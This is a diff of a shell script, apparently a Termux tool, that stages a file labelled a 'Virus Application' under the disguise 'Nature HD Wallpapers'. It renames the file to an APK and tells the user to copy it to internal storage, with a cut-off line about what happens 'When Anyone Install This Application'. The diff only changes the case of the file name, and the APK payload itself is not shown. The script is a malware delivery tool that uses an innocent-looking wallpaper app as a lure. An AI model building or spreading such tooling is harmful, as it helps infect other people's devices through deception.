@@ -35,17 +35,17 @@ echo -e "\e[32m~Downloading "Nature HD Wallpapers" Virus Application "|pv -qL 20
 sleep 1
 echo -e "\e[94m"
 cd •
-cp Nature_Hd_Walpapers. ..
+cp Nature_hd_walpapers. ..
 cd ..
-mv Nature_Hd_Walpapers. Nature_Hd_Walpapers.apk
+mv Nature_hd_walpapers. Nature_hd_walpapers.apk
 
 echo "••••••••••••••••••100%"|pv -qL 10
 echo " "
 sleep 1
-echo -e "\e[92mNature_Hd_Walpapers.apk File Downloaded Successfully"
+echo -e "\e[92mNature_hd_walpapers.apk File Downloaded Successfully"
 echo " "
 sleep 1
-echo -e "\e[96mNow Type :- cp Nature_Hd_Walpapers.apk /sdcard "
+echo -e "\e[96mNow Type :- cp Nature_hd_walpapers.apk /sdcard "
 echo -e "\e[96mTo COPY The Tvirus App File To "
 echo -e "\e[96mYour INTERNAL STORAGE "
 echo -e "\e[96mWhen Anyone Install This Application"
